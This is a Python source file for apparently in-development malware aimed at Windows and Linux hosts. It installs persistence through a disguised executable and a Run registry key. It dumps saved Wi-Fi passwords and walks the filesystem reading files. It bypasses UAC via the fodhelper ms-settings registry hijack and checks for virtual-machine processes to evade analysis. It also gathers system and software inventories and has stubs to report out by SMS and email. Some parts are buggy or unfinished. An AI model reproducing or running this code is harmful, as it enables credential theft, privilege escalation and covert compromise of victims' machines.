#To-do List:
#  1. Link all the functions
#  2. Test the UAC bypass function
#  3. Reduce some unnecessary stuff!


import os
import shutil
import platform
import subprocess
import re
import requests
from io import StringIO 
import traceback
import wmi
import winreg
import sys
import ctypes
from winreg import (HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, OpenKey, EnumValue, QueryValueEx)
import time
from time import sleep
from sinchsms import SinchSMS
from mailjet_rest import Client
import psutil


#----------------------------------------------PERSISTENCE----------------------------------------------------------------------------------#
def persistence():
	evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
	if not os.path.exists(evil_file_location):
		shutil.copyfile(sys.executable, evil_file_location)
		subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location+ '"', Shell=True)
#------------------------------------------------------------------------------------------------------------------------------------------

#----------------------------------------SOFTWARE-INFO---------------------------------------------------------------------------------#
def software_info():
    softFile = open('softLog.log', 'w')
    errorLog = open('errors.log', 'w')
    r = wmi.Registry ()
    result, names = r.EnumKey (hDefKey=HKEY_LOCAL_MACHINE, sSubKeyName=r"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
    softFile.write(r"These subkeys are found under 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\Windows\\CurrentVersion\\Uninstall\n\n'")
    errorLog.write("Errors\n\n")
    separator = "*" * 80
    keyPath = r"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    for subkey in names:
        try:
            softFile.write(separator + '\n\n')
            path = keyPath + "\\" + subkey
            key = OpenKey(HKEY_LOCAL_MACHINE, path, 0, KEY_ALL_ACCESS)
            try:
                temp = QueryValueEx(key, 'DisplayName')
                display = str(temp[0])
                softFile.write('Display Name: ' + display + '\nRegkey: ' + subkey + '\n')
            except:
                softFile.write('Regkey: ' + subkey + '\n')
        except:
            fp = StringIO()
            traceback.print_exc(file=fp)
            errorMessage = fp.getvalue()
            error = 'Error for ' + key + '. Message follows:\n' + errorMessage
            errorLog.write(error)
            errorLog.write("\n\n")
        softFile.write(result)

    softFile.close()
    errorLog.close()

#----------------------------------------------------------------------------------------------------------------------------------

#------------------------------------BASIC-SYSTEM-INFO------------------------------------------------------------------------------#
def system_info_basic():
    my_system = platform.uname()
    result = open("sys_info_b.txt", "w")
    result.write(f"System: {my_system.system}")
    result.write(f"Node Name: {my_system.node}")
    result.write(f"Release: {my_system.release}")
    result.write(f"Version: {my_system.version}")
    result.write(f"Machine: {my_system.machine}")
    result.write(f"Processor: {my_system.processor}")
    result.close()

#-------------------------------------------------------------------------------------------------------------------------------------#

#------------------------------------------SYSTEM-INFO--------------------------------------------------------------------------------#
def system_info():
    result = open("sysinfo.txt", "w")
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    for item in Id:
        new.append(str(item.split("\r")[:-1]))
        for i in new:
            result.write(i[2:-2])
    result.close()

#------------------------------------------------------------------------------------------------------------------------------------#
def net_info_lin():
    result = open("net_info.txt", "w")
    data = subprocess.check_output(['ipconfig','/all']).decode('utf-8').split('\n')
    for item in data:
        result.write(item.split('\r')[:-1])
    result.close()

def file_listing(basepath):
    basepath=basepath.replace(" ", "")
    for files in os.walk(basepath, topdown=False):
        THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
        for file_name in files:
            my_file = os.path.join(THIS_FOLDER, file_name)
            process_file(my_file)

def process_file(my_file):
    try:
        with open(my_file,'r') as f:
            data = f.read()
            print(data)     #file processing to be done here!   <--Still under development-->
            f.close()
    except IOError:
           print()

def download(url):
    get_response = requests.get(url)
    file_name =  url.split("/")[-1]
    with open (file_name, "wb") as out_file:
        out_file.write(get_response.content)

def win_wifi_pass():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    result = ""
    pattern = rb"(?:Profile\s*:\s)(.*)"
    network_names_list = re.findall(pattern, networks)
    for network_name in network_names_list:
        command = "netsh wlan show profile "+ network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result
    
    f=open("temp.txt","w+")
    f.write(result)
    f.close()


def lin_wifi_pass():
    basepath="/etc/NetworkManager/system-connections/"
    for files in os.walk(basepath, topdown=False):
        THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
        for file_name in files:
            my_file = os.path.join(THIS_FOLDER, file_name)
            try:
                with open(my_file,'r') as f:
                    data = f.read()
                    result = result + data
                    f.close()
            except IOError:
                print()
    
    f=open("temp.txt","w+")
    f.write(result)
    f.close()

#UAC Bypass
#-----------------------------------------------------------------------------
CMD                   = r"C:\Windows\System32\\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\\Classes\\ms-settings\\shell\\open\\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_reg_key(key, value):
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)

    except WindowsError:        
        raise

def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    

    except WindowsError:
        raise


def execute():        
    if not is_running_as_admin():
        print ('[!] The script is NOT running with administrative privileges')
        print ('[+] Trying to bypass the UAC')
        try:                
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            sys.exit(0)                
        
        except WindowsError:
            sys.exit(1)
         
    else:
        print ('[+] The script is running with administrative privileges!')

#--------------------------------------------------------------------------------------------------

#Sending SMS updates
#------------------------------------------------------------------------------------------------

def sendSMS(message):
    number = '<--add your number here-->'
    app_key = '' # get it after registering to  sinch sms!
    app_secret = '' #get it after registration 
    client = SinchSMS(app_key, app_secret)
    response = client.send_message(number, message) 
    message_id = response['messageId'] 
    response = client.check_status(message_id)
    while response['status'] != 'Successful':
        time.sleep(1) 
        response = client.check_status(message_id)

#------------------------------------------------------------------------------------------------
#Sending EMAIL
#------------------------------------------------------------------------------------------------

def sendEmail():
    email=""     #add you email here!
    api_key = ''   #get your api_key after registration
    api_secret = '' #get you api_secet after registration 
    mailjet = Client(auth=(api_key, api_secret), version='v3.1')
    data = ""
    {
      'Messages': 
        [
            {
                "From": 
                    {"Email": email, "Name": "<--add you name here-->"},
                              
                "To":
                    [
                        {"Email": email, "Name": "<--add you name here-->"}
                    ],
                                    
                    "Subject": "",
                    "TextPart": "",
                    "HTMLPart": "",
                    "CustomID": ""
                }
            ]
    }
    
    mailjet.send.create(data=data)

#------------------------------------------------------------------------------------------------------

#VIRTUAL-MACHINE EVASION
#-----------------------------------------------------------------------------------------------------
def VMEvasion():
    p1 = "vmsrvc.exe"
    p2 = "vmusrvc.exe"
    p3 = "vmtoolsd.exe"
    p4 = "vboxtray.exe"
    p5 = "df5serv.exe"
    p6 = "vboxservice.exe"

    path = r"C:\windows\system32\drivers"
    s1 = path + r"\\vmci.sys"
    s2 = path + r"\\vmhgfs.sys"
    s3 = path + r"\\vmmouse.sys"
    s4 = path + r"\\vmscsi.sys"
    s5 = path + r"\\vmusbmouse.sys"
    s6 = path + r"\\vmxnet.sys"
    s7 = path + r"\\VBoxMouse.sys"
    s8 = path + r"\\vmx_svga.sys"

    for process in psutil.process_iter():
        proc = process.name().lower()
        try:
            if (proc == p1 or proc == p2 or proc == p3 or proc == p4 or proc == p5 or proc == p6):
                print ("VM found")
                exit()

        except PermissionError:
            if (s1 == True or s2 == True or s3 == True or s4 == True or s5 == True or s6 == True or s7 == True or s8 == True):
                print ("VM found")
                exit()

#-----------------------------------------------------------------------------------------------------

#-----------UNDER-DEVELOPMENT--------------------------------------------------------------------------#

system_info_basic()
system_info()
OS=platform.system()

if (OS=="Linux"):
    file_listing('/')
    lin_wifi_pass()
    net_info_lin()

if (OS=="Windows"):
    file_listing("C:\\")
    win_wifi_pass()
    software_info()